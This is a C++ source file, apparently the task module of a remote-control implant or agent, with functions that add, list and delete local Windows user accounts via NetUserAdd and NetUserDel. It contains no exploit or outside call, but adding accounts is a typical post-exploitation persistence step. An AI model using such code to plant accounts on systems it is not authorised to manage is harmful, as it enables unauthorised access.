#include "core/task.hpp"

namespace Task
{
    std::wstring UserAdd(State::PSTATE pState, const std::wstring& wUsername, const std::wstring& wPassword)
    {
        std::wstring result = L"";

        USER_INFO_1 ui;
        ui.usri1_name = const_cast<LPWSTR>(wUsername.c_str());
        ui.usri1_password = const_cast<LPWSTR>(wPassword.c_str());
        ui.usri1_priv = USER_PRIV_USER;
        ui.usri1_home_dir = nullptr;
        ui.usri1_comment = nullptr;
        ui.usri1_flags = UF_SCRIPT;
        ui.usri1_script_path = nullptr;

        DWORD dwLevel = 1;
        DWORD dwError = 0;

        // NET_API_STATUS status = pState->pProcs->lpNetUserAdd( // I dont' know why this is not working...
        NET_API_STATUS status = NetUserAdd(
            nullptr,
            dwLevel,
            (LPBYTE)&ui,
            &dwError
        );
        if (status == NERR_Success)
        {
            result = L"Success: User \"" + wUsername + L"\" has been added successfully.";
        }
        else if (status == ERROR_ACCESS_DENIED)
        {
            result = L"Error: Access Denied";
        }
        else
        {
            result = L"Error: Failed to add new user.";
        }

        return result;
    }

    std::wstring UserLs(State::PSTATE pState)
    {
        std::wstring result = L"";

        std::vector<std::wstring> users = System::User::AllUsersGet(pState->pProcs);
        if (users.size() == 0)
        {
            return L"Error: Users not found.";
        }

        for (const std::wstring& user : users)
        {
            result += user + L"\n";
        }

        return result;
    }

    std::wstring UserRm(State::PSTATE pState, const std::wstring& wUsername)
    {
        std::wstring result = L"";

        // NET_API_STATUS status = pState->pProcs->lpNetUserDel( // I don't know why this is not working...
        NET_API_STATUS status = NetUserDel(
            nullptr,
            wUsername.c_str()
        );
        if (status == NERR_Success)
        {
            result = L"Success: User \"" + wUsername + L"\" has been deleted successfully.";
        }
        else if (status == ERROR_ACCESS_DENIED)
        {
            result = L"Error: Access Denied";
        }
        else
        {
            result = L"Error: Failed to delete user.";
        }

        return result;
    }
}